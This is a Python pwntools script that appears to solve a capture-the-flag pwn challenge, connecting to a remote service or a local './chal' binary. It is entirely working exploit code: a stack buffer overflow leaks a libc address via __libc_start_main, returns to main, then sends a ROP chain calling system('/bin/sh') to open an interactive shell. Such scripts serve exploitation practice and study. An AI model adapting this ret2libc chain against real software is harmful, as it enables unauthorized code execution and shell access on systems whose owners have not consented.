#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chal"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("amt.rs", 31631)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        #b *main+117
        b *main+180
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)



# leak address && ret2main
rop_ret = 0x00401248

payload = b"A" * 8 * 3
payload += p64(0x000000cd00000000)
payload += p64(0xdeadbeefcafebabe)
payload += p64(rop_ret)# for movaps@printf
payload += p64(elf.symbols["main"])

p.recvuntil(":")
p.sendline(payload)

p.recvline()
leak = eval(b"0x" + p.recv(12))
log.info("leak: " + hex(leak))
libc_base = leak - libc.symbols["__libc_start_main"] - 0x85
libc.address = libc_base
log.info("libc base: " + hex(libc_base))

rop_pop_rdi = libc_base + 0x0017a00f

payload = b"B" * 8 * 3
payload += p64(0)
payload += p64(0xdeadbeefcafebabe)
payload += p64(rop_ret)
payload += p64(rop_pop_rdi)
payload += p64(next(libc.search(b"/bin/sh\0")))
payload += p64(libc.symbols["system"])

p.recvuntil(":")
p.sendline(payload)

p.interactive()
